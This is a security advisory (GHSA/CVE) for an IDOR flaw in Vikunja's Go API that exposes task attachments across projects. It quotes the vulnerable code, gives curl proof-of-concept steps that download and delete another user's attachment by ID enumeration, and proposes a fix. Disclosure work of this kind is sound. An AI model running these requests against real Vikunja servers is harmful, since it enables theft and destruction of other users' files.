# [H] Vikjuna: IDOR in Task Attachment ReadOne Allows Cross-Project File Access and Deletion

## Summary
Severity: High
Advisory: GHSA-jfmm-mjcp-8wq2
CVE: CVE-2026-33678
CWE: CWE-639
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N (CVSS_V3)
Published: 2026-03-25
Source: https://github.com/advisories/GHSA-jfmm-mjcp-8wq2
Type: github-advisory

## Affected
- Go: `code.vikunja.io/api` — affected >=0 <2.2.1

## Details
## Summary

`TaskAttachment.ReadOne()` queries attachments by ID only (`WHERE id = ?`), ignoring the task ID from the URL path. The permission check in `CanRead()` validates access to the task specified in the URL, but `ReadOne()` loads a different attachment that may belong to a task in another project. This allows any authenticated user to download or delete any attachment in the system by providing their own accessible task ID with a target attachment ID. Attachment IDs are sequential integers, making enumeration trivial.

## Details

The vulnerability is in `pkg/models/task_attachment.go` in the `ReadOne` method:

```go
// pkg/models/task_attachment.go:110-120
func (ta *TaskAttachment) ReadOne(s *xorm.Session, _ web.Auth) (err error) {
	exists, err := s.Where("id = ?", ta.ID).Get(ta)  // Only checks attachment ID, ignores TaskID
	if err != nil {
		return
	}
	if !exists {
		return ErrTaskAttachmentDoesNotExist{
			TaskID:       ta.TaskID,
			AttachmentID: ta.ID,
		}
	}
	// ...
}
```

The permission check in `pkg/models/task_attachment_permissions.go` validates access to the URL task, not the attachment's actual task:

```go
// pkg/models/task_attachment_permissions.go:25-28
func (ta *TaskAttachment) CanRead(s *xorm.Session, a web.Auth) (bool, int, error) {
	t := &Task{ID: ta.TaskID}  // ta.TaskID is from URL param :task
	return t.CanRead(s, a)
}
```

The `TaskAttachment` struct binds URL parameters via struct tags (`param:"task"` and `param:"attachment"`):
```go
// pkg/models/task_attachment.go:41-42
ID     int64 `xorm:"bigint autoincr not null unique pk" json:"id" param:"attachment"`
TaskID int64 `xorm:"bigint not null" json:"task_id" param:"task"`
```

**Attack flow for read (GET):**
The custom handler at `pkg/routes/api/v1/task_attachment.go:156` calls `CanRead` (checks URL task) then `ReadOne` (loads attachment by ID only).

**Attack flow for delete (DELETE):**
The generic CRUD handler calls `CanDelete` (checks write on URL task) then `Delete` which calls `ReadOne` (loads any attachment by ID), then deletes it.

This is the same vulnerability pattern that was already fixed for task comments, where `getTaskCommentSimple` was patched to add `AND task_id = ?` validation:

```go
// pkg/models/task_comments.go:196-205 (the fix)
func getTaskCommentSimple(s *xorm.Session, tc *TaskComment) error {
	query := s.Where("id = ?", tc.ID).NoAutoCondition()
	if tc.TaskID != 0 {
		query = query.And("task_id = ?", tc.TaskID)
	}
	// ...
}
```

## PoC

**Prerequisites:** Two users (attacker and victim). Victim has a project with a task that has a file attachment. Attacker has read access to any task (e.g., their own project).

**Step 1:** Attacker creates their own project and task.

```bash
# Attacker creates a project
curl -s -X PUT 'http://localhost:3456/api/v1/projects' \
  -H 'Authorization: Bearer <attacker_token>' \
  -H 'Content-Type: application/json' \
  -d '{"title":"attacker project"}' | jq '.id'
# Returns: 10

# Attacker creates a task in their project
curl -s -X PUT 'http://localhost:3456/api/v1/projects/10/tasks' \
  -H 'Authorization: Bearer <attacker_token>' \
  -H 'Content-Type: application/json' \
  -d '{"title":"attacker task"}' | jq '.id'
# Returns: 50
```

**Step 2:** Victim uploads a confidential attachment to their task (in a different project the attacker has no access to).

```bash
curl -s -X PUT 'http://localhost:3456/api/v1/tasks/1/attachments' \
  -H 'Authorization: Bearer <victim_token>' \
  -F 'files=@secret-document.pdf'
# Returns attachment with id: 5
```

**Step 3:** Attacker downloads the victim's attachment by referencing their own task ID but the victim's attachment ID.

```bash
# Attacker accesses victim's attachment (id=5) via their own task (id=50)
curl -s -X GET 'http://localhost:3456/api/v1/tasks/50/attachments/5' \
  -H 'Authorization: Bearer <attacker_token>' \
  -o stolen-file.pdf
# Returns: victim's secret-document.pdf
```

**Step 4:** Attacker can also delete the victim's attachment.

```bash
curl -s -X DELETE 'http://localhost:3456/api/v1/tasks/50/attachments/5' \
  -H 'Authorization: Bearer <attacker_token>'
# Returns: 200 OK — victim's attachment is deleted
```

Since attachment IDs are sequential autoincrement integers, the attacker can enumerate all attachments in the system (1, 2, 3, ...).

## Impact

- **Confidentiality:** Any authenticated user can download any file attachment in the entire system, regardless of project permissions. This includes confidential documents, images, and any files uploaded as task attachments.
- **Integrity:** Any authenticated user with write access to any task can delete any attachment in the system, causing data loss for other users.
- **Enumeration:** Sequential integer IDs make it trivial to iterate through all attachments without any prior knowledge of target attachment IDs.
- **Scope:** Affects all Vikunja instances with task attachments enabled (the default).

## Recommended Fix

Add `task_id` validation to `ReadOne`, mirroring the fix already applied to task comments:

```go
// pkg/models/task_attachment.go
func (ta *TaskAttachment) ReadOne(s *xorm.Session, _ web.Auth) (err error) {
	query := s.Where("id = ?", ta.ID)
	if ta.TaskID != 0 {
		query = query.And("task_id = ?", ta.TaskID)
	}
	exists, err := query.Get(ta)
	if err != nil {
		return
	}
	if !exists {
		return ErrTaskAttachmentDoesNotExist{
			TaskID:       ta.TaskID,
			AttachmentID: ta.ID,
		}
	}

	// ... rest unchanged
}
```

## References
- https://github.com/go-vikunja/vikunja/security/advisories/GHSA-jfmm-mjcp-8wq2
- https://nvd.nist.gov/vuln/detail/CVE-2026-33678
- https://github.com/go-vikunja/vikunja
- https://vikunja.io/changelog/vikunja-v2.2.2-was-released
